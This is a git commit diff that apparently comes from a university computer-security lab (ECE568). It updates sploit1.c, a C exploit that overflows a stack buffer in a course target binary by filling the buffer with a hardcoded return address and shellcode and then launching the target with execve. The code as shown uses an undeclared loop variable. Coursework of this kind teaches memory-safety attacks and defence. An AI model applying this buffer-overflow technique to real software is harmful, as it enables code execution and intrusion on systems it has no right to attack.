b3ba330a17ae482b146994c153ec02bce6a00914
Osiris-H <zcy1435773091@gamil.com>
2024-01-20 13:40:04 -0500

    Update: sploit1.c

--- ECE568-lab1/sploits/sploit1.c
+++ ECE568-lab1/sploits/sploit1.c
@@ -5,20 +5,42 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
+#define ADDR 0x3021fe50
+#define NOP 0x90
+#define BUF_SIZE 124 // fec8 - fe50 = 120; add 4 bytes for the return addr
 
-int
-main ( int argc, char * argv[] )
+// through the cmd line, we know the following addr,
+// lab_main starts at 0x3021fec8
+// buf starts at 0x3021fe50
+int main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
+    char *ptr;
 
-	args[0] = TARGET;
-	args[1] = "hi there";
+    long *addr_ptr;
+
+    char buff[BUF_SIZE];
+
+    ptr = buff;
+    addr_ptr = (long *) ptr;
+    // set address
+    for (i = 0; i < BUF_SIZE; i+=4)
+        *(addr_ptr++) = ADDR;
+
+    // write shellcode
+    for (i = 0; i < strlen(shellcode); i++)
+        *(ptr++) = shellcode[i];
+
+    buff[BUF_SIZE - 1] = '\0';
+
+    args[0] = TARGET;
+	args[1] = buff;
 	args[2] = NULL;
 
 	env[0] = NULL;
 
-	if ( execve (TARGET, args, env) < 0 )
+	if (execve (TARGET, args, env) < 0)
 		fprintf (stderr, "execve failed.\n");
 
 	return (0);
